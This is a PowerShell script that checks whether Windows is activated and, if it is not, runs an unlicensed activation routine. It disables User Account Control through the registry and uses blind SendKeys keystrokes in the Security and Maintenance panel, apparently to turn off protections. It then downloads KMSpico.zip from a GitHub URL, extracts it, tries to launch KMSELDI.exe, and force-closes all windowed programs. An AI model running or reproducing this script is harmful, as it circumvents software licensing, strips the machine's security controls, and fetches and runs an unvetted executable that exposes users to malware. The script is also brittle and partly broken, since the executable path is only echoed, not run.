$IsActivated = Get-CimInstance SoftwareLicensingProduct -Filter "Name like 'Windows%'" | where { $_.PartialProductKey } | select LicenseStatus
if ($IsActivated.LicenseStatus -ne 1) {
$user = whoami
$user = $user.split("\")[-1]
$path = 'C:\Users\' + $user + '\AppData\Roaming\ActivationWindows'
new-item $path -ItemType Directory
Set-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' -value 0
#P1
$value = Get-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA'
if ($value.EnableLUA -eq 1){
shutdown /r -t 0}
#P2
Add-Type -AssemblyName System.Windows.Forms
notepad
sleep 1
Get-ControlPanelItem -Name "*Maintenance*" | Show-ControlPanelItem
sleep 3
[System.Windows.Forms.SendKeys]::SendWait("^{l}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait(" ")
sleep 3
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait(" ")
sleep 3
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait(" ")
sleep 3
[System.Windows.Forms.SendKeys]::SendWait(" ")
sleep 3
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait(" ")
sleep 3
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait(" ")
sleep 3
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait(" ")
sleep 3
[System.Windows.Forms.SendKeys]::SendWait("%{F4}")
#P3
$path_zip = $path + '\KMS.zip'
Invoke-WebRequest -Uri https://github.com/sleilos/KMS/raw/main/KMSpico.zip -OutFile $path_zip
sleep 3
$path_archive = $path + '\'
Expand-Archive $path_zip -DestinationPath $path_archive
sleep 3
#Sound KO
(new-object -com wscript.shell).SendKeys([char]173)
sleep 1
$path_exe = $path + '\KMSpico\KMSELDI.exe'
$path_exe
sleep 5
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait("{TAB}")
sleep 1
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
sleep 15
if ((Get-Process KMSELDI 2>1) -ne $null){
taskkill /IM KMSELDI.exe /F}
sleep 1
#Sound OK
(new-object -com wscript.shell).SendKeys([char]174)
sleep 1
(new-object -com wscript.shell).SendKeys([char]175)
sleep 1
Get-Process | Where-Object {$_.MainWindowTitle -ne ""} | stop-process
sleep 1
exit
}
else {Exit}